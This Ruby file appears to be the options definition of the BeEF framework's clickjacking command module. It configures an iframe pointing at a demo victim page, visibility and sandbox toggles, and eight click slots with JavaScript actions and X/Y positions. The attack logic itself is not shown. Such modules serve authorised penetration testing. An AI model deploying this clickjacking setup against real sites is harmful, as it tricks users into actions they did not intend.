#
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
class Clickjacking < BeEF::Core::Command

	def self.options

		configuration = BeEF::Core::Configuration.instance
		uri = "http://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}/demos/clickjacking/clickjack_victim.html"

		return [
		{'name' => 'iFrameSrc', 'ui_label'=>'iFrame Src', 'type' => 'textarea', 'value' => uri, 'width' => '400px', 'height' => '50px'},
		{'name' => 'iFrameSecurityZone', 'ui_label' => 'Security restricted (IE)', 'type' => 'checkbox' },
		{'name' => 'iFrameSandbox', 'ui_label' => 'Sandbox', 'type' => 'checkbox' },
		{'name' => 'iFrameVisibility', 'ui_label' => 'Show Attack', 'type' => 'checkbox', 'checked' => 'checked' },
		{'name' => 'clickDelay', 'ui_label' => 'Click Delay (ms)', 'value' => '300', 'width' => '100px' },
		{'name' => 'iFrameWidth', 'ui_label' => 'iFrame Width', 'value' => '16', 'width' => '100px' },
		{'name' => 'iFrameHeight', 'ui_label' => 'iFrame Height', 'value' => '10', 'width' => '100px' },

		{'name' => 'Click_1', 'type' => 'label', 'html' => '~~~~~~~~~~ CLICK 1' },
		{'name' => 'clickaction_1', 'ui_label'=>'JS', 'type' => 'textarea', 'value' =>'$("#overlay1").data("overlay").close();', 'width' => '400px', 'height' => '50px'},
		{'name' => 'iFrameLeft_1', 'ui_label' => 'X-pos', 'value' => '20', 'width'=>'100px' },
		{'name' => 'iFrameTop_1', 'ui_label' => 'Y-pos', 'value' => '50', 'width'=>'100px' },

		{'name' => 'Click_2', 'type' => 'label', 'html' => '~~~~~~~~~~ CLICK 2' },
		{'name' => 'clickaction_2', 'ui_label'=>'JS', 'type' => 'textarea', 'value' =>'$(".more-quotes").trigger("click");', 'width' => '400px', 'height' => '50px'},
		{'name' => 'iFrameLeft_2', 'ui_label' => 'X-pos', 'value' => '20', 'width'=>'100px' },
		{'name' => 'iFrameTop_2', 'ui_label' => 'Y-pos', 'value' => '123', 'width'=>'100px' },

		{'name' => 'Click_3', 'type' => 'label', 'html' => '~~~~~~~~~~ CLICK 3' },
		{'name' => 'clickaction_3', 'ui_label'=>'JS', 'type' => 'textarea', 'value' =>'void(0)', 'width' => '400px', 'height' => '50px'},
		{'name' => 'iFrameLeft_3', 'ui_label' => 'X-pos', 'value' => '-', 'width'=>'100px' },
		{'name' => 'iFrameTop_3', 'ui_label' => 'Y-pos', 'value' => '-', 'width'=>'100px' },

		{'name' => 'Click_4', 'type' => 'label', 'html' => '~~~~~~~~~~ CLICK 4' },
		{'name' => 'clickaction_4', 'ui_label'=>'JS', 'type' => 'textarea', 'value' =>'void(0)', 'width' => '400px', 'height' => '50px'},
		{'name' => 'iFrameLeft_4', 'ui_label' => 'X-pos', 'value' => '-', 'width'=>'100px' },
		{'name' => 'iFrameTop_4', 'ui_label' => 'Y-pos', 'value' => '-', 'width'=>'100px' },

		{'name' => 'Click_5', 'type' => 'label', 'html' => '~~~~~~~~~~ CLICK 5' },
		{'name' => 'clickaction_5', 'ui_label'=>'JS', 'type' => 'textarea', 'value' =>'void(0)', 'width' => '400px', 'height' => '50px'},
		{'name' => 'iFrameLeft_5', 'ui_label' => 'X-pos', 'value' => '-', 'width'=>'100px' },
		{'name' => 'iFrameTop_5', 'ui_label' => 'Y-pos', 'value' => '-', 'width'=>'100px' },

		{'name' => 'Click_6', 'type' => 'label', 'html' => '~~~~~~~~~~ CLICK 5' },
		{'name' => 'clickaction_6', 'ui_label'=>'JS', 'type' => 'textarea', 'value' =>'void(0)', 'width' => '400px', 'height' => '50px'},
		{'name' => 'iFrameLeft_6', 'ui_label' => 'X-pos', 'value' => '-', 'width'=>'100px' },
		{'name' => 'iFrameTop_6', 'ui_label' => 'Y-pos', 'value' => '-', 'width'=>'100px' },

		{'name' => 'Click_7', 'type' => 'label', 'html' => '~~~~~~~~~~ CLICK 7' },
		{'name' => 'clickaction_7', 'ui_label'=>'JS', 'type' => 'textarea', 'value' =>'void(0)', 'width' => '400px', 'height' => '50px'},
		{'name' => 'iFrameLeft_7', 'ui_label' => 'X-pos', 'value' => '-', 'width'=>'100px' },
		{'name' => 'iFrameTop_7', 'ui_label' => 'Y-pos', 'value' => '-', 'width'=>'100px' },

		{'name' => 'Click_8', 'type' => 'label', 'html' => '~~~~~~~~~~ CLICK 8' },
		{'name' => 'clickaction_8', 'ui_label'=>'JS', 'type' => 'textarea', 'value' =>'void(0)', 'width' => '400px', 'height' => '50px'},
		{'name' => 'iFrameLeft_8', 'ui_label' => 'X-pos', 'value' => '-', 'width'=>'100px' },
		{'name' => 'iFrameTop_8', 'ui_label' => 'Y-pos', 'value' => '-', 'width'=>'100px' }

	]
	end

	def post_execute
		save({'clickjack' => @datastore['clickjack']})
	end

end
